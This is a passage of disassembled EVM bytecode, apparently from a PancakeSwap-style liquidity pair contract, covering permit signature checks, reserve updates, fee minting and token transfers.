0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1830 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1881 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x188C DUP10 DUP10 DUP10 PUSH2 0x2079 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x18E2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x18F2 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1946 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x195A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1970 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x19D7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1A0C DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A29 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A37 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1A70 JUMPI PUSH2 0x1A5B PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1A6A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1A90 JUMP JUMPDEST PUSH2 0x1A8D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1ACF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25FF PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AD9 DUP11 DUP11 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1B52 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1C62 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1BB7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C44 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xF SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D16 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1CF7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D78 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D7D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1DAB JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1DAB JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1DFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1E1E JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1E1B JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1ED4 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1F19 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1F49 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x1F5D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x1FCE JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x1F8B DUP6 PUSH2 0x1F76 DUP7 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2568 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x1FB6 DUP5 PUSH2 0x1F76 DUP8 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2104 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x2139 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x21D4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x21E8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x21FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x22E2 JUMPI DUP1 ISZERO PUSH2 0x22DD JUMPI PUSH1 0x0 PUSH2 0x2241 PUSH2 0xFC4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x224E DUP4 PUSH2 0x22F6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x22DA JUMPI PUSH1 0x0 PUSH2 0x2281 PUSH1 0x8 PUSH2 0xB47 PUSH2 0x2272 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x22B6 PUSH2 0x2299 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22AA DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x22C3 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x22D6 JUMPI PUSH2 0x22D6 DUP8 DUP3 PUSH2 0x2348 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x22EE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x22EE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x2339 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2333 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x2322 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x232B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x230B JUMP JUMPDEST POP PUSH2 0x2343 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2343 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x235B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2386 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x23DB JUMPI DUP2 PUSH2 0x23DD JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x240D SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x243A SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 